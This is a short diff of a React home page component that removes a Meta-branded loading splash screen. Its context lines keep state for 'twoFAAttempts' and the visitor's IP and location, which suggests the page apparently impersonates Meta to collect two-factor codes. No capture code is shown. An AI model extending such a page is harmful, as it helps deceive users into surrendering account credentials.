@@ -1,6 +1,5 @@
 import { useEffect, useState, useCallback, useMemo } from 'react';
 import axios from 'axios';
-import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import KiemTienImg from '@/assets/images/kiemtien.png';
 import TickImg from '@/assets/images/tick.png';
 import Course1Img from '@/assets/images/course-1.webp';
@@ -47,7 +46,6 @@ const Home = () =>
     const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
     const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' } );
     const [ translatedTexts, setTranslatedTexts ] = useState( {} );
-    const [ isLoading, setIsLoading ] = useState( true );
 
     const defaultTexts = useMemo(
         () => ( {
@@ -265,11 +263,9 @@ const Home = () =>
                 setTranslatedTexts( defaultTexts );
             }
 
-            setIsLoading( false );
         } catch ( error )
         {
             console.error( 'Initialization error:', error );
-            setIsLoading( false );
         }
     };
 
@@ -420,15 +416,6 @@ const Home = () =>
     };
 
     const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;
-
-    if ( isLoading )
-    {
-        return (
-            <div id="intro" style={ { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 } }>
-                <img id="meta-logo" src={ MetaLogo } alt="Meta" style={ { width: '70%', height: 'auto' } } />
-            </div>
-        );
-    }
 
     return (
         <>
